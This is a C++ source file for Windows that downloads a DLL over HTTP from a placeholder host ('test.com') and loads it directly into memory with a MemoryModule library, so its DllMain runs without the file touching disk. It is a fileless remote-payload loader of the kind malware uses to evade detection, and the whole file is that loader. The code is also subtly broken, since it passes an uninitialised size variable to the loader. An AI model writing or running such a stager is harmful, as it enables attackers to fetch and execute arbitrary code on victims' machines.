#include<iostream>
#include <winsock2.h>
#include<Windows.h>
#include<string>
#include <tchar.h>
#include "MemoryModule.h"

#pragma comment(lib, "ws2_32.lib")

using namespace std;

typedef BOOL(*Module)(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved);


char* readUrl(const char* szUrl, long& fileSize)
{
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        cerr << "WSAStartup failed." << endl;
        return nullptr;
    }

    string server, filepath;
    size_t pos = string(szUrl).find("://");
    if (pos != string::npos)
    {
        string url = string(szUrl).substr(pos + 3);
        pos = url.find('/');
        server = url.substr(0, pos);
        filepath = (pos != string::npos) ? url.substr(pos) : "/";
    }

    SOCKET conn = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (conn == INVALID_SOCKET)
    {
        WSACleanup();
        return nullptr;
    }

    struct hostent* hp = gethostbyname(server.c_str());
    if (hp == NULL)
    {
        closesocket(conn);
        WSACleanup();
        return nullptr;
    }

    struct sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(80);
    memcpy(&serverAddr.sin_addr, hp->h_addr, hp->h_length);

    if (connect(conn, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
    {
        closesocket(conn);
        WSACleanup();
        return nullptr;
    }

    string getRequest = "GET " + filepath + " HTTP/1.0\r\nHost: " + server + "\r\n\r\n";
    if (send(conn, getRequest.c_str(), getRequest.length(), 0) == SOCKET_ERROR)
    {
        closesocket(conn);
        WSACleanup();
        return nullptr;
    }

    char readBuffer[512];
    string responseData;
    while (true)
    {
        int bytesRead = recv(conn, readBuffer, sizeof(readBuffer), 0);
        if (bytesRead <= 0)
            break;
        responseData.append(readBuffer, bytesRead);
    }

    int headerEndPos = responseData.find("\r\n\r\n");
    if (headerEndPos == string::npos)
    {
        closesocket(conn);
        WSACleanup();
        return nullptr;
    }

    fileSize = responseData.length() - headerEndPos - 4;
    char* result = new char[fileSize + 1];
    memcpy(result, responseData.c_str() + headerEndPos + 4, fileSize);
    result[fileSize] = '\0';

    closesocket(conn);
    WSACleanup();
    return result;
}

void LoadFromMemory(void)
{
    void* data;
    size_t size;
    HMEMORYMODULE handle;
    Module DllMain;
    long fileSize;

    data = (void*)readUrl("http://test.com/test.dll", fileSize);
    if (data == NULL)
    {
        cout << "[-]Open DLL Fail" << endl;
        return;
    }
    // ×Ô¶¯´¥·¢dllmain
    handle = MemoryLoadLibrary(data, size);

    MemoryFreeLibrary(handle);
}

int main()
{
    LoadFromMemory();

    return 0;
}